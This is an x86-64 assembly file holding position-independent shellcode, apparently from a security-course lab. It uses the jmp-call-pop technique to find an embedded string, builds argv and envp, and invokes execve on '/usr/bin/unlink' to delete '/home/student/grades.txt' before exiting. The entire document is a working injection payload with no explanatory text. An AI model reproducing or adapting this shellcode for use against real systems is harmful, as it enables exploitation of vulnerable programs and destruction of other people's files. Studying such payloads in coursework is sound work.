#include <sys/syscall.h>

#define STRING    "/usr/bin/unlinkA/home/student/grades.txt"
#define STRLEN    41
#define ARGV    (STRLEN+1)
#define ENVP    (ARGV+24)

.globl main
    .type    main, @function

 main:
    jmp    calladdr

 popladdr:
    xorq    %rax,%rax        /* get a 64-bit zero value */
    popq    %rcx    /* address of string */

    movq    %rcx,(ARGV)(%rcx)    /* first arg */
    leaq    (16)(%rcx),%rbx
    movq    %rbx,(ARGV+8)(%rcx) /* second arg */
    movq    %rax,(ARGV+16)(%rcx) /* NULL end */
    movb    %al,(15)(%rcx)    /* null-terminate our string 1 */
    movb    %al,(40)(%rcx)    /* null-terminate our string 2 */
    movq    %rax,(ENVP)(%rcx)    /* set up null envp */

    movb    $SYS_execve,%al        /* set up the syscall number */
    movq    %rcx,%rdi        /* syscall arg 1: string pathname */
    leaq    ARGV(%rcx),%rsi        /* syscall arg 2: argv */
    leaq    ENVP(%rcx),%rdx        /* syscall arg 3: envp */
    syscall                /* invoke syscall */

    xorq    %rax,%rax        /* get a 64-bit zero value */
    movb    $SYS_exit,%al        /* set up the syscall number */
    xorq    %rdi,%rdi        /* syscall arg 1: 0 */
    syscall                /* invoke syscall */

 calladdr:
    call    popladdr
    .ascii    STRING
